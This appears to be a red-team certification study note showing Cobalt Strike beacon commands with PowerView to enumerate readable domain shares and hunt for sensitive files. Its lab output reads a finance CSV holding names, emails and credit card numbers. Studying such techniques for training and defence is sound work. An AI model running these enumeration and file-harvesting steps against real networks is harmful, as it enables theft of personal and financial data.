

#### 🖊️ via Cobalt Strike

1) `Find-DomainShare` in PowerView searches for computer shares on the domain.  The `-CheckShareAccess` parameter only shows that shares the current user has read access to.

```
beacon> powershell Find-DomainShare -CheckShareAccess

Name             Type Remark                                      ComputerName             
----             ---- ------                                      ------------             
CertEnroll          0 Active Directory Certificate Services share dc-2.dev.cyberbotic.io   
home$               0                                             dc-2.dev.cyberbotic.io   
NETLOGON            0 Logon server share                          dc-2.dev.cyberbotic.io   
software            0                                             dc-2.dev.cyberbotic.io   
SYSVOL              0 Logon server share                          dc-2.dev.cyberbotic.io   
finance$            0                                             fs.dev.cyberbotic.io
```

2) `Find-InterestingDomainShareFile` takes this a step further and searches each share, returning results where the specified strings appear in the path.

```
beacon> powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*

Owner          : BUILTIN\Administrators
CreationTime   : 9/15/2022 4:22:55 PM
Path           : \\fs.dev.cyberbotic.io\finance$\export.csv
LastAccessTime : 9/15/2022 4:23:21 PM
LastWriteTime  : 9/15/2022 4:22:55 PM
Length         : 8076

beacon> powershell gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

id,first_name,last_name,email,address,postal_code,credit_card
1,Emmery,Sutton,esutton0@blogspot.com,4788 Ronald Regan Drive,,374288148757510
2,Abie,Maffezzoli,amaffezzoli1@dagondesign.com,6897 Butternut Alley,,374288483637400
```




#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 21:55
🏷️ tags: #redteam #crto 

---

